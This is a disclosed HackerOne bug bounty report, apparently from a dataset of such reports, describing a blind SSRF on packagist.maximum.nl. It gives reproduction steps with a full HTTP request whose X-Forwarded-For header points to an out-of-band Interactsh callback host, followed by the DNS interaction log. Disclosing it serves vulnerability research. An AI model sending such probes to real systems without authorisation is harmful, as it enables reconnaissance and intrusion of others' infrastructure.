---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1538056'
original_report_id: '1538056'
title: Blind SSRF at packagist.maximum.nl
weakness: Server-Side Request Forgery (SSRF)
team_handle: radancy
created_at: '2022-04-11T21:37:37.843Z'
disclosed_at: '2022-07-10T12:38:02.458Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 33
asset_identifier: '*.maximum.nl'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# Blind SSRF at packagist.maximum.nl

## Metadata

- HackerOne Report ID: 1538056
- Weakness: Server-Side Request Forgery (SSRF)
- Program: radancy
- Disclosed At: 2022-07-10T12:38:02.458Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Team,

I found a subdomain vulnerable to header blind SSRF: packagist.maximum.nl

## Steps to Reproduce
1 - Go to https://packagist.maximum.nl/ and intercept it.
2 - Send a GET request adding the parameter X-Forwarded-For and adding a header X-Forwarded-For, the value the header is your Burp Collaborator or similar (Requestbin, Interactsh, your server, etc)
GET /?X-Forwarded-For HTTP/1.1
X-Forwarded-For: your-server

Look my request, I used Interactsh:
```GET /?X-Forwarded-For HTTP/2
Host: packagist.maximum.nl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
X-Forwarded-For: c9a9rsjsppqr5jq1fc505qebqe1y6g41n.oast.pro
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```
3 - Look your server, burp collaborator or Interactsh.

Response of my server (Interactsh):
```[c9a9rsjsppqr5jq1fc505qebqe1y6g41n] Received DNS interaction (A) from ████████ at 2022-04-11 21:31:46```

## Impact

The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
